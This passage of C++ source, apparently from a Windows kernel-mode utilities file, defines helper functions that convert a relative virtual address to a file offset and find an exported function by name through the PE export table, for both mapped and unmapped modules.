	@return File offset for a virtual address, NULL if not found.
*/
ULONG
Utilities::RVA2Offset (
	_In_ PIMAGE_NT_HEADERS NtHeaders,
	_In_ PIMAGE_SECTION_HEADER SectionHeader,
	_In_ DWORD VirtualAddress
	)
{
	ULONG i;

	//
	// Enumerate every section to find the section that contains the EAT virtual address.
	//
	for (i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
	{
		if (VirtualAddress >= SectionHeader[i].VirtualAddress &&
			VirtualAddress < (SectionHeader[i].VirtualAddress + SectionHeader[i].SizeOfRawData))
		{
			return (VirtualAddress - SectionHeader[i].VirtualAddress) + SectionHeader[i].PointerToRawData;
		}
	}

	return NULL;
}

/**
	Find an exported function by its name.
	@param Module - Pointer to the module to search.
	@param ExportName - Name of the target export.
	@param MappedModule - Has the modules' sections been mapped to the appropriate virtual addresses?
	@return Pointer to the exported function, NULL if not found.
*/
PVOID
Utilities::FindExportByName (
	_In_ PVOID Module,
	_In_ CHAR* ExportName,
	_In_ BOOLEAN MappedModule
	)
{
	ULONG_PTR longModule;
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeaders;
	PIMAGE_SECTION_HEADER sectionHeader;
	ULONG eatDirectoryOffset;
	PIMAGE_EXPORT_DIRECTORY eatDirectory;
	DWORD* eatFunctions;
	WORD* eatOrdinals;
	DWORD* eatNames;
	ULONG i;
	CHAR* currentExportName;
	DWORD eatNameOffset;

	longModule = RCAST<ULONG64>(Module);
	sectionHeader = NULL;

	//
	// The dos header is just the module base.
	//
	dosHeader = RCAST<PIMAGE_DOS_HEADER>(Module);
	if (dosHeader->e_magic != 'ZM')
	{
		DBGPRINT("Utilities!FindExportByName: Module has invalid DOS header.");
		return NULL;
	}

	ntHeaders = RCAST<PIMAGE_NT_HEADERS>(longModule + dosHeader->e_lfanew);
	if (ntHeaders->Signature != 'EP')
	{
		DBGPRINT("Utilities!FindExportByName: Module has invalid NT header.");
		return NULL;
	}

	//
	// Get the EAT data directory.
	//
	eatDirectoryOffset = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (MappedModule == FALSE)
	{
		sectionHeader = RCAST<PIMAGE_SECTION_HEADER>(ntHeaders + 1);
		eatDirectoryOffset = RVA2Offset(ntHeaders, sectionHeader, eatDirectoryOffset);
	}
	eatDirectory = RCAST<PIMAGE_EXPORT_DIRECTORY>(longModule + eatDirectoryOffset);

	eatFunctions = RCAST<DWORD*>(longModule + eatDirectory->AddressOfFunctions);
	eatOrdinals = RCAST<WORD*>(longModule + eatDirectory->AddressOfNameOrdinals);
	eatNames = RCAST<DWORD*>(longModule + eatDirectory->AddressOfNames);

	if (MappedModule == FALSE)
	{
		eatFunctions = RCAST<DWORD*>(longModule + RVA2Offset(ntHeaders, sectionHeader, eatDirectory->AddressOfFunctions));
		eatOrdinals = RCAST<WORD*>(longModule + RVA2Offset(ntHeaders, sectionHeader, eatDirectory->AddressOfNameOrdinals));
		eatNames = RCAST<DWORD*>(longModule + RVA2Offset(ntHeaders, sectionHeader, eatDirectory->AddressOfNames));
	}

	//
	// Iterate over every export with a name.
	//
	for (i = 0; i < eatDirectory->NumberOfNames; i++)
	{
		eatNameOffset = eatNames[i];
		if (MappedModule == FALSE)
		{
			eatNameOffset = RVA2Offset(ntHeaders, sectionHeader, eatNameOffset);
		}
		currentExportName = RCAST<CHAR*>(longModule + eatNameOffset);

		//
		// Check if the export name matches our desired export.
		//
		if (strcmp(currentExportName, ExportName) == 0)
		{
			if (MappedModule == FALSE)
			{
				return RCAST<PVOID>(longModule + RVA2Offset(ntHeaders, sectionHeader, eatFunctions[eatOrdinals[i]]));
			}
			return RCAST<PVOID>(longModule + eatFunctions[eatOrdinals[i]]);
		}
	}

	return NULL;
}